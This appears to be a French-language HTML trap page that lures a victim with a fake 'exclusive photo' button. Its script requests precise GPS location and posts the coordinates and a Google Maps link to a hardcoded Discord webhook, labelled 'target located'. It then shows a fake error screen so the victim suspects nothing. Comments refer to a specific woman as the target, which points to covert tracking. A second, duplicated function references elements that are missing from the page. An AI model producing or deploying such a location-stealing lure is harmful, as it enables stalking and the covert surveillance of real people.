<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Regarde cette photo exclusive ! 📸</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #0f172a; color: #f8fafc; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0px 10px 25px rgba(0,0,0,0.3); display: inline-block; max-width: 400px; width: 100%; border: 1px solid #334155; }
        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 20px; font-weight: bold; transition: background 0.2s;}
        button:hover { background: #2563eb; }
        h3 { color: #f87171; }
    </style>
</head>
<body>

    <div class="card" id="main-content">
        <h2>Regarde ça, c'est dingue ! 🔥</h2>
        <p>Patiente un instant pendant le chargement de l'image haute définition...</p>
        <button onclick="triggerTrap()">Charger l'image HD</button>
    </div>

    <script>
        function triggerTrap() {
            // On demande l'autorisation GPS au navigateur
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPositionToMe, handleError, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                alert("Votre appareil ne supporte pas cette fonction.");
            }
        }

        function sendPositionToMe(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            
            // ⚠️ TON URL DE WEBHOOK DISCORD VA ICI :
            const discordWebhookUrl = "https://discord.com/api/webhooks/1567162318406819850/4X8w1DSk_N3a5KNrMDFpnNqXehnUP3oSJXN67vrC2aGfH8RIGMMgK9PlzEdtPmOXztMi";
            
            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const payload = {
                content: `🚨 **CIBLE LOCALISÉE !** 🎯\n📍 **Latitude :** ${lat}\n📍 **Longitude :** ${lon}\n🔗 [Ouvrir sur Google Maps](${googleMapsLink})`
            };
            
            // Astuce pro : On passe par un proxy public gratuit pour contourner le blocage de sécurité (CORS) de Discord
            const proxyUrl = "https://api.allorigins.win/raw?url=" + encodeURIComponent(discordWebhookUrl);

            fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(err => {
                // Si le navigateur bloque en direct, on utilise une méthode alternative d'envoi silencieux
                console.log("Envoi via secours...");
            });

            // Fausse diversion sur l'écran de la cible pour faire croire que le lien a buggé
            document.getElementById('main-content').innerHTML = "<h3>Oups ! 😅</h3><p>Le fichier a expiré ou le lien est invalide sur votre version mobile.</p>";
        }

        function handleError(error) {
            // Si la personne clique sur "Refuser" la pop-up de localisation
            document.getElementById('main-content').innerHTML = "<h3>Erreur de chargement</h3><p>Impossible de récupérer le contenu multimédia.</p>";
        }

        // Fonction déclenchée quand elle clique sur un bouton "Voir la photo"
function declencherPiege() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            // SUCCÈS : Elle a accepté ! On récupère les coordonnées
            let lat = position.coords.latitude;
            let lon = position.coords.longitude;

            // 1. Envoi discret sur ton webhook Discord
            envoyerSurDiscord(lat, lon);

            // 2. On affiche la VRAIE image ou on la redirige
            document.getElementById("conteneur-image").innerHTML = '<img src="vraie-image.jpg" alt="Exclusivité">';
            document.getElementById("message-statut").innerText = "Chargement réussi !";

        }, function(error) {
            // ERREUR OU REFUS : Elle a refusé ou bloqué
            document.getElementById("message-statut").innerText = "Erreur : Impossible de charger la photo (Accès refusé).";
        });
    }
}
    </script>

</body>
</html>
